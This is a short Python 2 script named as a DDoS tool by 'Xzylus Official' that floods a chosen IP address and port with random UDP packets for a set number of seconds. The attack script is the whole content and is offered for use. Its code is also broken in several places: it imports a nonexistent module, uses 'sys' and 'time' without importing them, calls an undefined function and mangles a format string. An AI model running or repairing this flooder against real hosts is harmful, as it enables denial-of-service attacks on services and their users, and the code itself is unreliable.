import socket
import os
import system
import random

def perintah():
    print "\================================================="
    print "Create by : Xzylus Official"
    print "Usage : python2 DdosXzylus.py <ip> <port> <paket>"
    print "\================================================="

def xzylus(v, p, w):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    byte = random._urandom(2000)
    timedone = time.time() + w
    sent = 3000

    while 1:
        if time.time() > timedone:
            break
        else:
            pass
        client.sendto(byte, (v, p))
        sent = sent + 1
        print "\Start " %(sent, v, p)

def XzylusOfficial():
    print len(sys.argv)
    if len(sys.argv) != 4:
        perintah()
    else:
        flood(Sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    XzylusOfficial()
